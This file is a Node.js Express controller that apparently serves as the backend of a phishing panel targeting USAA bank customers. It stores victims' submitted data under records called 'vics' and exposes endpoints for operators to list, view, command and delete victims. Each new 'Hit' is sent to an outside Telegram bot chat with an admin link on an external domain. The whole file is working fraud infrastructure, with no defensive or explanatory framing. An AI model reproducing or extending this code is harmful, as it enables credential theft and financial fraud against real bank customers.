var moment = require("moment"); // require
const Panel = require("../models/panelModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
	const { owner, panelName } = req.params;
	Panel.find({ owner, panelName: "usaa" })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid } = req.body;
	// const { panelName } = req.params;
	try {
		await Panel.findOneAndUpdate(
			{ uniqueid, panelName: "usaa" },
			req.body
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid, panelName } = req.params;
	Panel.findOne({ uniqueid, panelName: "usaa" }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitData = async (req, res) => {
	// const { panelName } = req.params;
	panelName = "usaa";
	let data = req.body;
	data.timestamp = moment().format();
	data.panelName = panelName;
	try {
		let user = await Panel.create(data);
		message = `New ${panelName} Hit:\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=${panelName}&password=${
			data.owner ? data.owner : user.owner
		}`;
		await axios
			.post(`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`, {
				chat_id: 680379375,
				text: message,
				parse_mode: "Markdown",
			})
			.catch((e) => {
				console.log(e);
			});
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { panelName } = req.params;
	const { uniqueid } = req.body;
	try {
		await Panel.deleteOne({ uniqueid, panelName: "usaa" });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	getInfo,
	deleteEntry,
	submitData,
	command,
};
